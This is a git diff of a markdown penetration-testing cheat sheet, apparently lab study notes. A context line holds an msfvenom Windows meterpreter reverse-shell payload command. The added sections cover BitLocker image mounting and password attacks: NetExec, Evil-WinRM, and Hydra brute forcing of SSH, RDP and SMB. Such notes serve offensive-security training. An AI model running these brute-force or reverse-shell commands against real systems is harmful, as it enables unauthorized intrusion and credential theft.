@@ -83,6 +83,7 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=1337 -f aspx 
 
 ```
 
+<br>
 
 ### Hashcat
 ```
@@ -99,7 +100,7 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=1337 -f aspx 
 
 ```
 
-
+<br>
 ### Cracking Protected Files 
 ```
 # Find protected files 
@@ -117,7 +118,7 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=1337 -f aspx 
     3. john ssh.hash --show 
 
 ```
-
+<br>
 ### Cracking archived / ZIP files 
 ```
 # Get list of compression ext
@@ -139,7 +140,44 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=1337 -f aspx 
         3a. sudo mkdir -p /media/bitlocker
         3b. sudo mkdir -p /media/bitlockermount 
         3c. sudo losetup -f -P Backup.vhd
+            3ci. sudo fdisk -l
         3d. sudo dislocker /dev/loop0p2 -u1234qwer -- /media/bitlocker
         3d. sudo mount -o loop /media/bitlocker/dislocker-file /media/bitlockermount
         3e. cd /media/bitlocker/
+
+```
+
+<br> 
+
+### Networking Services 
+```
+# NetExec for password attacks 
+    # Supports: {nfs,ftp,ssh,winrm,smb,wmi,rdp,mssql,ldap,vnc}
+
+    # Generic cmdline 
+    - netexec <proto> <target-IP> -u <user or userlist> -p <password or passwordlist>
+
+
+# Evil WinRM 
+    - evil-winrm -i <target-IP> -u <username> -p <password>
+
+
+# Hydra - Brute force ssh  
+    - hydra -L user.list -P password.list ssh://[ip]
+
+
+# RDP - Hydra 
+    - hydra -L user.list -P password.list rdp://[ip]
+
+
+# SMB (Client Server Data Transfer) 
+    Hydra: hydra -L user.list -P password.list smb://[ip]
+
+    Metasploit: use auxiliary/scanner/smb/smb_login
+
+    Netexec: netexec smb [ip] -u "user" -p "password" --shares
+
+    # Use SMB Client to communicate with the shares once you have creds 
+
+
 ```
